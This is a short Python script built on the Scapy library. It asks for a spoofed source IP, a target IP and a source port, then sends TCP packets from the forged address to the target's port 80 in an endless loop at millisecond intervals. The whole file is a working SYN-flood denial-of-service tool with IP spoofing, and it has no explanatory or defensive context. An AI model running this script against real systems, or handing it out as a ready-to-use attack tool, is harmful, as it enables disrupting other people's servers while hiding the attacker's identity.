from __future__ import print_function
from scapy.all import *
import sys

if sys.version_info < (3,0):
  input = raw_input

src = input('Enter A Spoofed IP:\t')
target = input('Enter Target IP:\t')
srcport = int(input('Enter Source Port:\t'))
i = 1
while True:
  try:
    IP1 = IP(src=src, dst=target)
    TCP1 = TCP(sport=srcport, dport=80)
    pkt = IP1 / TCP1
    send(pkt, inter=.001)
    print('Packet Sent', i)
    i = i + 1
  except KeyboardInterrupt:
    break